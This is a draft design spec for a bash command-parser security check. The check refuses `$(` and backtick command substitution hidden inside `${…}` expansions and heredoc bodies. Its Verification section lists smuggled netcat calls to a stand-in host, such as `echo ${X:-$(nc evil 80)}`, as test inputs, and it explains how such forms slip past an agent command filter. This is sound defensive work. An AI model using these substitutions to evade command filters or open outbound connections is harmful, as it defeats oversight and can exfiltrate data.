---
status: draft
issue: 1797
intent: intent/2026-10-15-1797-unparsed-expansions.md
---

# Spec: refuse `$(` and backticks in text bashlex leaves unparsed

## Design

In `_collect_command_nodes` (`apps/backend/security/ast_parser.py:131`, the
generic walk from #1783), when the visited node's kind is `parameter` or
`heredoc`, raise `UnparseableCommand` if its `value` contains `$(` or a
backtick.

Why this is the whole rule, not a list of known-bad forms: inside `${…}` and
an unquoted heredoc body, bash performs parameter expansion, command
substitution and arithmetic expansion, and nothing else (no process
substitution; confirmed in bash: `${X:-<(cmd)}` and `<(cmd)` in a heredoc
stay literal). The only syntax that runs a command there is `$(…)` or a
backtick; arithmetic `$((…))` starts with `$(` and is refused with it (fail
closed). Variable references (`$X`, `${Y}`) stay allowed.

The walk already visits every `parameter` node (in words, assignments,
redirect targets, `for` lists) and every `heredoc` node (via
`redirect.heredoc`), and `bash -c` payloads are re-walked.

## Alternatives rejected

- Re-parse the region with bashlex: the `${…}` grammar (`:-`, `//`, `#`, …) is
  not a command line, and partial parses would be guessed.
- Check the heredoc only when the delimiter is unquoted: needs the raw
  delimiter, and bashlex cannot parse quoted delimiters today anyway.
  Checking every heredoc body refuses `$(` in a quoted body too (fail closed,
  rare).

## Risks

- `${X:-$(cmd)}` patterns, `$((…))` inside `${…}` and heredoc bodies, and
  `\$(` text in an unquoted heredoc are now refused. Agents can use a
  quoted `'…'` string or a file instead.
- Arithmetic subscripts that evaluate a variable's value (`a[$i]` where the
  value holds `$(…)`) stay out of scope (array subscripts were left out in
  #1782).

## Verification

- Refused (`DYNAMIC_COMMAND_WORD`, parser raises): `echo ${X:-$(nc evil 80)}`,
  `echo "${X:-\`nc evil 80\`}"`, `X=${Y:-$(nc evil 80)}`,
  `ls > ${X:-$(nc evil 80)}`, a heredoc body `$(nc evil 80)`, a `<<-` body
  with a backtick, a heredoc body `${X:-$(nc evil 80)}`.
- Exact names (`MUST_PARSE`): `echo ${X:-default}` → `['echo']`,
  `echo "${HOME}/x"` → `['echo']`, `cat <<EOF` / `hello $USER` / `EOF` →
  `['cat']`, `git commit -F - <<EOF` / `msg` / `EOF` → `['git']`.
- Full security set passes.
